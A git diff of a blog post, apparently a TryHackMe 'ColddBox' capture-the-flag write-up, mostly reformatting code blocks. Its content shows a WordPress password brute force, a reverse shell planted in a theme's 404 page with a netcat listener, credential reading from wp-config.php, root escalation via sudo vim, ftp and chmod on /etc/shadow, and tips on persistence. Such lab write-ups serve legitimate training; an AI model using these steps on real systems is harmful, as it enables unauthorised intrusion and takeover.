@@ -1,21 +1,20 @@
 ---
-title: "Coldbox"
+title: "Colddbox"
 date: 2022-09-20T16:00:31+01:00
 draft: false
 categories:
   - TryHackMe
 ---
 
-<img src="colddbox.png" alt="colddbox" width=200>
+{{< post-img src="colddbox.png" alt="colddbox" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
 
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: ColddBox | One more machine
@@ -23,24 +22,22 @@ PORT   STATE SERVICE REASON  VERSION
 
 ```
 
-### gobuster
-
-```
+```bash
 /.hta                 (Status: 403) [Size: 276]
 /.htpasswd            (Status: 403) [Size: 276]
 /.htaccess            (Status: 403) [Size: 276]
 /hidden               (Status: 301) [Size: 311] [--> http://10.10.32.43/hidden/]
-/index.php            (Status: 301) [Size: 0] [--> http://10.10.32.43/] 
-/server-status        (Status: 403) [Size: 276]    
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.32.43/]
+/server-status        (Status: 403) [Size: 276]
 /wp-admin             (Status: 301) [Size: 313] [--> http://10.10.32.43/wp-admin/]
 /wp-content           (Status: 301) [Size: 315] [--> http://10.10.32.43/wp-content/]
 /wp-includes          (Status: 301) [Size: 316] [--> http://10.10.32.43/wp-includes/]
-/xmlrpc.php           (Status: 200) [Size: 42] 
+/xmlrpc.php           (Status: 200) [Size: 42]
 ```
 
 Guess the CMS! lol lets check the hidden dir first
 
-```
+```text
 U-R-G-E-N-T
 C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
 
@@ -54,10 +51,10 @@ I chose wpscan this time
 
 Tried Hugo and Philip but it didnt work so C0ldd
 
-```
+```bash
 ...
 [+] Performing password attack on Wp Login against 1 user/s
-[SUCCESS] - c0ldd / 9876543210                                                                                                                                                                                                              
+[SUCCESS] - c0ldd / 9876543210
 Trying c0ldd / 7654321 Time: 00:03:13 <                                                                                                                                                            > (1225 / 14345617)  0.00%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
@@ -67,11 +64,11 @@ Trying c0ldd / 7654321 Time: 00:03:13 <                                         
 
 So let's GO! on admin dashboard we go for appearance editor
 
-classic reverse shell in 404 page 
+classic reverse shell in 404 page
 
 then visit 'http://10.10.196.224/wp-content/themes/twentyfifteen/404.php` to get access
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 46852
@@ -81,12 +78,12 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
-www-data@ColddBox-Easy:/$ 
+www-data@ColddBox-Easy:/$
 
 ```
 Try to get user flag
 
-```
+```bash
 www-data@ColddBox-Easy:/$ ls
 ls
 bin   home            lib64       opt   sbin  tmp      vmlinuz.old
@@ -109,11 +106,11 @@ cat: user.txt: Permission denied
 ```
 Be disappointed!
 
-Enumerate more...Remember to always check php config code! 
+Enumerate more...Remember to always check php config code!
 
 Back to /var/www/html look for config files
 
-```
+```bash
 www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
 cat wp-config.php
 
@@ -137,7 +134,7 @@ define('DB_HOST', 'localhost');
 ```
 Take some pride
 
-```
+```bash
 www-data@ColddBox-Easy:/var/www/html$ su c0ldd
 su c0ldd
 Password: cybersecurity
@@ -153,7 +150,7 @@ Ok the real thing starts here!
 
 the author said there were many ways to Privesc so let's explore some
 
-```
+```bash
 c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
 sudo -l
 [sudo] password for c0ldd: cybersecurity
@@ -167,7 +164,7 @@ El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
     (root) /bin/chmod
     (root) /usr/bin/ftp
 ```
-```
+```bash
 c0ldd@ColddBox-Easy:/var/www/html$ find / -perm -u=s 2>/dev/null
 find / -perm -u=s 2>/dev/null
 /bin/su
@@ -195,7 +192,7 @@ find / -perm -u=s 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-```
+```bash
 c0ldd@ColddBox-Easy:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -215,27 +212,27 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 hmm yeah...some ways with sudo!
 
-```
+```bash
 c0ldd@ColddBox-Easy:/var/www/html$ netstat -tunlp
 netstat -tunlp
 (No todos los procesos pueden ser identificados, no hay información de propiedad del proceso
  no se mostrarán, necesita ser superusuario para verlos todos.)
 Conexiones activas de Internet (solo servidores)
 Proto  Recib Enviad Dirección local         Dirección remota       Estado       PID/Program name
-tcp        0      0 0.0.0.0:4512            0.0.0.0:*               ESCUCHAR    -               
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               ESCUCHAR    -               
-tcp6       0      0 :::4512                 :::*                    ESCUCHAR    -               
-tcp6       0      0 :::80                   :::*                    ESCUCHAR    -               
-udp        0      0 0.0.0.0:68              0.0.0.0:*                           -    
+tcp        0      0 0.0.0.0:4512            0.0.0.0:*               ESCUCHAR    -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               ESCUCHAR    -
+tcp6       0      0 :::4512                 :::*                    ESCUCHAR    -
+tcp6       0      0 :::80                   :::*                    ESCUCHAR    -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
 ```
 
 Aha! seems like I missed a port earlier! SSH is open on a high port
 
-```
+```bash
 PORT     STATE  SERVICE REASON       VERSION
 3306/tcp closed mysql   conn-refused
 4512/tcp open   ssh     syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
 |   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
@@ -248,13 +245,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 nice! we have a quicker access with `c0ldd:cybersecurity`!
 
-```
+```bash
 └──╼ $ssh c0ldd@10.10.231.210 -p 4512
 The authenticity of host '[10.10.231.210]:4512 ([10.10.231.210]:4512)' can't be established.
 ECDSA key fingerprint is SHA256:xDx1I3ynEOfBDWPnJPLQG+C4XjZhBw/6Rig/bz2tMxM.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[10.10.231.210]:4512' (ECDSA) to the list of known hosts.
-c0ldd@10.10.231.210's password: 
+c0ldd@10.10.231.210's password:
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -267,29 +264,29 @@ Pueden actualizarse 129 paquetes.
 
 
 Last login: Mon Nov  8 13:20:08 2021 from 10.0.2.15
-c0ldd@ColddBox-Easy:~$ 
+c0ldd@ColddBox-Easy:~$
 well..enumeration is always the key ! I also checked for processes, key files permissions...
 
 "information is power" so you can add `linenum` to get more
 
 I only use those scripts as last resort so I wont do it!
 
-there is already 3 main methods anyway 
+there is already 3 main methods anyway
 
 Feel free to ssh to try more...
 
 ```
 ### The good old way
 
-We alread know vim/vi or some text editors run commands so basically if they run as root
+We already know vim/vi or some text editors run commands so basically if they run as root
 
 we run commands as root...ask nicely for a shell
 
-```
+```bash
 c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'
-[sudo] password for c0ldd: 
+[sudo] password for c0ldd:
 
-# id                               
+# id
 uid=0(root) gid=0(root) groups=0(root)
 
 ```
@@ -298,7 +295,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ftp runs commands? who would know?
 
-```
+```bash
 c0ldd@ColddBox-Easy:~$ sudo ftp
 ftp> !/bin/sh
 # id
@@ -309,7 +306,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 sudo on chmod is like communism memes, it belongs to everyone
 
-```
+```bash
 c0ldd@ColddBox-Easy:~$ sudo chmod 777 /etc/shadow
 c0ldd@ColddBox-Easy:~$ cat /etc/shadow | grep c0ldd
 c0ldd:$6$AnciUfDx$Y9lDZThc6/Q/rWMajprHD54ynCLBmy8swBujZO.CG6b7j7YZiR/RIrdhzn2euH1A9r2jJE2U0bbLarUFdwSI40:18529:0:99999:7:::
@@ -317,13 +314,13 @@ c0ldd@ColddBox-Easy:~$ cat /etc/shadow | grep root
 root:$6$VMnvWAfh$Yg04FhiScJ8Pv3ET6Ys.4G.BdLC0HyyxcDB1jVa28F20gdz4zI.GyrQSg8elF4nx3yH1g3ZKA/uvO8Fqll.T70:18939:0:99999:7:::
 
 ```
-At this point you can do anything lol! 
+At this point you can do anything lol!
 
 you are basically root already
 
 Like seriously
 
-```
+```bash
 c0ldd@ColddBox-Easy:~$ sudo chmod 777 /root
 c0ldd@ColddBox-Easy:~$ cd /root
 c0ldd@ColddBox-Easy:/root$ ls
@@ -334,15 +331,13 @@ c0ldd@ColddBox-Easy:/root$ ls
 root.txt
 ```
 
-If you want real persistance just change root password in /etc/shadow
+If you want real persistence just change root password in /etc/shadow
 
 or just add a user with superprivileges idk...get creative
 
-
-
 Now whatever method suits you, Don forget to grab the stuff
 
-```
+```bash
 # cd /root
 # ls
 root.txt
